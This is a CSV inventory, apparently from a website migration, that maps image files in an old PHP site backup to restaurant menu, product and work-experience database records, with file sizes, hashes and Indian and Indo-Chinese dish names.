256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_small_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_small_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_small_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_img
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_small_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_small_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_small_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_small_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_small_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_small_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_small_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_small_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_small_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_img
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_small_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_small_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_small_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_small_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_small_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_small_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_small_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_small_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_small_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_small_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_small_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_small_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_small_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_small_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_small_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_small_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_small_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_small_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_small_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_small_img
302.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_img
302.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_small_img
303.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_img
303.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_small_img
304.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/304.jpg,92432,de4b382f04e803c3b8e5ba04b23fc13e11d5e60fd517598834deef5fc2f6ff8d,69be6751e79b38bcec94742ae297dce3,DB Mapped (Verified),menu_item_tbl,304,Kimchi - China,menu_img
304.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/304.jpg,92432,de4b382f04e803c3b8e5ba04b23fc13e11d5e60fd517598834deef5fc2f6ff8d,69be6751e79b38bcec94742ae297dce3,DB Mapped (Verified),menu_item_tbl,304,Kimchi - China,menu_small_img
305.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_img
305.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_small_img
315.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_img
315.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_small_img
316.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_img
316.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_small_img
317.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_img
317.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_small_img
318.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_img
318.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_small_img
319.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_img
319.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_small_img
320.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_img
320.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_small_img
321.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_img
321.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_small_img
322.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_img
322.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_small_img
323.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_img
323.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_small_img
324.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_img
